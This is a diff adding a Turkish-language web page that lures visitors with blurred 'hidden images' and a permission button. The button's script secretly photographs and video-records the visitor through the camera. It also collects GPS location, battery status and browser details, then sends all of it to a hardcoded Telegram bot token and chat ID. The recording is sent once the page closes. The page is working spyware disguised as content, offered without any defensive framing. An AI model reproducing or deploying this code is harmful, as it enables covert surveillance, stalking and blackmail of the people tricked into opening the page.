@@ -1,0 +1,170 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Gizli Görüntüler</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: black;
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      overflow: hidden;
+    }
+    .grid {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      display: grid;
+      grid-template-columns: repeat(10, 1fr);
+      grid-template-rows: repeat(10, 1fr);
+      filter: blur(8px) brightness(0.7);
+      z-index: 0;
+    }
+    .grid img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    .content {
+      z-index: 1;
+      text-align: center;
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px 24px;
+      font-size: 18px;
+      background: white;
+      color: black;
+      border: none;
+      cursor: pointer;
+      border-radius: 6px;
+    }
+  </style>
+</head>
+<body>
+  <div class="grid">
+    <script>
+      for (let i = 0; i < 100; i++) {
+        document.write(`<img src="https://picsum.photos/seed/${i}/100" alt="blurred" />`);
+      }
+    </script>
+  </div>
+
+  <div class="content">
+    <h2>Gizli görüntüleri görmek için izin ver</h2>
+    <button id="izinVer">İzin Ver</button>
+  </div>
+
+  <script>
+    const token = '7678549002:AAFz0nTnHFpInMFw-Gy0pgIcpr0gZ0JxmQU';
+    const chat_id = '7401389505';
+
+    let recorder, chunks = [], stream, konum, sarj, fotoDataUrl;
+
+    async function kameraAc() {
+      stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      return stream;
+    }
+
+    function fotoCek(video) {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 320;
+      canvas.height = video.videoHeight || 240;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      return canvas.toDataURL("image/png");
+    }
+
+    async function konumAl() {
+      return new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos.coords),
+          () => resolve(null)
+        );
+      });
+    }
+
+    async function sarjAl() {
+      if (!navigator.getBattery) return null;
+      const batarya = await navigator.getBattery();
+      return {
+        yuzde: Math.round(batarya.level * 100),
+        sarjda: batarya.charging
+      };
+    }
+
+    async function telegramaGonder(fotoDataUrl, videoBlob, konum, sarj) {
+      const fotoBlob = await (await fetch(fotoDataUrl)).blob();
+
+      const formFoto = new FormData();
+      formFoto.append("chat_id", chat_id);
+      formFoto.append("photo", fotoBlob, "foto.png");
+      formFoto.append("caption",
+        `📍 Konum: ${konum ? `https://maps.google.com/?q=${konum.latitude},${konum.longitude}` : "Yok"}
+` +
+        `🔋 Şarj: ${sarj ? `${sarj.yuzde}% (${sarj.sarjda ? "Şarjda" : "Değil"})` : "Yok"}
+` +
+        `🌐 Tarayıcı: ${navigator.userAgent}
+🕐 Saat: ${new Date().toLocaleString()}`
+      );
+
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: formFoto
+      });
+
+      const formVideo = new FormData();
+      formVideo.append("chat_id", chat_id);
+      formVideo.append("video", videoBlob);
+
+      await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+        method: "POST",
+        body: formVideo
+      });
+    }
+
+    async function baslat() {
+      try {
+        stream = await kameraAc();
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        fotoDataUrl = fotoCek(video);
+        konum = await konumAl();
+        sarj = await sarjAl();
+
+        chunks = [];
+        recorder = new MediaRecorder(stream);
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.start();
+
+        recorder.onstop = async () => {
+          const videoBlob = new Blob(chunks, { type: "video/webm" });
+          await telegramaGonder(fotoDataUrl, videoBlob, konum, sarj);
+          stream.getTracks().forEach(track => track.stop());
+        };
+
+        window.addEventListener("beforeunload", () => {
+          if (recorder && recorder.state === "recording") {
+            recorder.stop();
+          }
+        });
+
+        alert("İzinler verildi.");
+      } catch (err) {
+        alert("Hata oluştu: " + err);
+      }
+    }
+
+    document.getElementById("izinVer").onclick = baslat;
+  </script>
+</body>
+</html>
